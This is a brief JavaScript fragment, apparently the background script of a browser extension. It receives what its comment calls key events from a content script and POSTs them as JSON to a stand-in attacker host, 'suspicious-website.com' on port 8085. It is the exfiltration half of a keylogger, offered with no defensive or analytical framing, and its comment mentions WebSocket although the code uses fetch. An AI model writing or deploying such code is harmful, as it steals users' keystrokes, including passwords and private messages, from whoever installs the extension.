// Listen for key events from content script and send via WebSocket
browser.runtime.onMessage.addListener((message) => {
    if (message.action === 'sendData') {
        const data = message.data;

        // Send data via HTTP POST
        fetch('http://suspicious-website.com:8085', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ data: data })
        }).then(response => {
            if (response.ok) {
                console.log('Data sent successfully');
            } else {
                console.error('Failed to send data');
            }
        }).catch(error => {
            console.error('Error sending data', error);
        });
    }
});
